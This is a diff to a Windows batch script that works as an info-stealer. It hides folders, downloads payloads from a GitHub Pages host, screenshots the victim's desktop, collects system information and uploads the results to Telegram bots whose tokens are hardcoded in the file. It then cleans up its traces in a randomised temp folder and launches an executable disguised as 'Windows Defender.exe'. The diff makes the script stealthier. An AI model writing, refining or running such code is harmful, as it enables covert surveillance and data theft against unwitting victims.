@@ -19,9 +19,11 @@ mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --output "%appdata%\Ookla\Speedtest CLI\speedtest-cli.ini" 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
 
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
+set "folder=%random%"
+mkdir "%temp%\%folder%"
+cd "%temp%\%folder%"
 
-mkdir "%temp%\resources"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
@@ -72,8 +74,6 @@ curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition
 for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
 curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
-del /q /s /a *.png
-del /q /s /a "%username%@computername%.txt"
-del /q /s /a osinfo.vbs
+rmdir /s /q "%temp%\%folder%"
 
 "%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
